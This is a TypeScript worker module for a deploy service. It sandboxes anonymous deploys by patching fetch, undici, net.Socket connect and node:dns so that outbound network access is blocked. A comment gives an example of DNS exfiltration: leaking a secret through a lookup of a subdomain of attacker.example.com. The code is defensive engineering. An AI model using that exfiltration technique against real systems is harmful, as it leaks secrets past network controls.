import { serveBundleServer } from "../start-server.js"

interface BootOptions {
  bundlePath: string
  clientPath?: string
  cwd: string
  port: number
  hostname?: string
  // sha256 hex of the claim token. Worker compares hashes of incoming
  // x-pond-claim-token headers (timing-safe). Plaintext never leaves the
  // host process or sits on disk — the only persisted copy was previously
  // in deploys/<id>.json, which is the leak vector this closes.
  inspectSecretHash?: string
  publicInspect?: boolean
  allowedOrigins?: string[]
  restrictNetwork?: boolean
  maxRestoreBytes?: number
}

type ParentMessage = { type: "boot"; options: BootOptions } | { type: "shutdown" }

let server: { close: (cb?: (err?: Error) => void) => void } | null = null

function send(msg: object) {
  if (process.send) process.send(msg)
}

// Exported only so the regression test can exercise the shim in an isolated
// child process. The worker itself calls it via the boot message path below.
export async function installNetworkRestriction() {
  const denyMsg = "Outbound network access disabled for anonymous deploys"
  const denyFetch = () => {
    throw new Error(denyMsg)
  }
  ;(globalThis as any).fetch = denyFetch
  try {
    // undici may not be installed and has no bundled types here; use a
    // string-built specifier so tsc doesn't try to resolve it.
    const specifier = "undici"
    const undici = (await import(specifier)) as { fetch?: unknown }
    if (undici && typeof undici === "object") (undici as { fetch?: unknown }).fetch = denyFetch
  } catch {
    // undici may not be installed; best-effort
  }
  // Patch net.Socket.prototype.connect — blocks node:http, node:https, tls.connect,
  // and any direct net.Socket usage. This isn't airtight (a determined capsule could
  // load a native module that bypasses the JS layer), but it raises the bar from
  // "one line of node:https" to "you have to ship native code."
  try {
    const net = await import("node:net")
    net.Socket.prototype.connect = function (...args: unknown[]) {
      const a0 = args[0]
      let host = ""
      let port: number | string = ""
      if (typeof a0 === "object" && a0 !== null) {
        const obj = a0 as { path?: unknown; host?: unknown; address?: unknown; port?: unknown }
        if (typeof obj.path === "string") {
          throw new Error(`${denyMsg} (unix socket: ${obj.path})`)
        }
        host = String(obj.host ?? obj.address ?? "")
        port = typeof obj.port === "number" || typeof obj.port === "string" ? obj.port : ""
      } else if (typeof a0 === "number" || typeof a0 === "string") {
        port = a0
        if (typeof args[1] === "string") host = args[1]
      }
      throw new Error(`${denyMsg} (attempted connect to ${host || "<unspecified>"}:${port})`)
    }
  } catch {
    // node:net should always be available; best-effort
  }
  // DNS: a capsule can leak data via dns.lookup("<secret>.attacker.example.com")
  // even with net.Socket.connect blocked, because the resolver query leaves the
  // host before any TCP connect. We patch node:dns here as defense-in-depth — it
  // closes the obvious dns.lookup/dns.resolve exfil at the JS layer. It is NOT
  // the boundary: a native addon (or a Node internal that bypasses these JS
  // entry points) can still resolve names, so DNS exfil is closed for real only
  // at the OS layer (the nft egress firewall drops 53/udp+tcp). Both layers run.
  try {
    // Patch the CommonJS module object (via createRequire), not the ESM
    // namespace from `import()` — builtin ESM namespaces are frozen, so
    // assigning to their properties silently no-ops. The CJS object is the
    // mutable surface every consumer (incl. ESM `import dns from "node:dns"`,
    // whose default export IS this object) reads its methods off of.
    const { createRequire } = await import("node:module")
    const require = createRequire(import.meta.url)
    const dns = require("node:dns") as Record<string, unknown> & { promises?: Record<string, unknown> }
    const { isIP } = await import("node:net")
    // A name we let through to the real resolver: a literal IP address (no DNS
    // query actually leaves the box) or loopback. These can't be used to
    // exfiltrate via the resolver, and the worker itself must resolve 127.0.0.1
    // / localhost to bind its own HTTP server. Everything else (a real hostname)
    // is blocked — that's the exfil channel.
    const isSafeName = (name: unknown): boolean => {
      if (typeof name !== "string") return false
      const n = name.trim().toLowerCase().replace(/\.$/, "")
      return isIP(n) !== 0 || n === "localhost"
    }
    const wrap = (orig: unknown) =>
      function (this: unknown, ...args: unknown[]) {
        if (isSafeName(args[0]) && typeof orig === "function") {
          return (orig as (...a: unknown[]) => unknown).apply(this, args)
        }
        const name = typeof args[0] === "string" ? args[0] : "<name>"
        const cb = args.find((a) => typeof a === "function") as ((err: Error) => void) | undefined
        const err = new Error(`${denyMsg} (dns resolve of ${name})`)
        // Callback-style (dns.lookup, dns.resolve): fail via callback, matching
        // the patched net.Socket's "fail loud" posture without crashing the loop.
        if (cb) {
          cb(err)
          return
        }
        throw err
      }
    const wrapPromise = (orig: unknown) =>
      async function (this: unknown, ...args: unknown[]) {
        if (isSafeName(args[0]) && typeof orig === "function") {
          return (orig as (...a: unknown[]) => unknown).apply(this, args)
        }
        const name = typeof args[0] === "string" ? args[0] : "<name>"
        throw new Error(`${denyMsg} (dns resolve of ${name})`)
      }
    for (const key of ["lookup", "resolve", "resolve4", "resolve6", "resolveAny"] as const) {
      if (typeof dns[key] === "function") dns[key] = wrap(dns[key])
    }
    if (dns.promises && typeof dns.promises === "object") {
      for (const key of ["lookup", "resolve", "resolve4", "resolve6", "resolveAny"] as const) {
        if (typeof dns.promises[key] === "function") dns.promises[key] = wrapPromise(dns.promises[key])
      }
    }
  } catch {
    // node:dns should always be available; best-effort
  }
}

process.on("message", async (msg: ParentMessage) => {
  if (msg.type === "boot") {
    try {
      if (msg.options.restrictNetwork) {
        await installNetworkRestriction()
      }
      const result = await serveBundleServer(msg.options)
      server = result.server
      send({ type: "booted", port: result.port })
    } catch (err: any) {
      send({ type: "error", message: err?.message ?? String(err) })
      process.exit(1)
    }
  } else if (msg.type === "shutdown") {
    if (!server) {
      send({ type: "closed" })
      process.exit(0)
    }
    await new Promise<void>((resolve) => server!.close(() => resolve()))
    send({ type: "closed" })
    process.exit(0)
  }
})

process.on("disconnect", () => {
  process.exit(0)
})
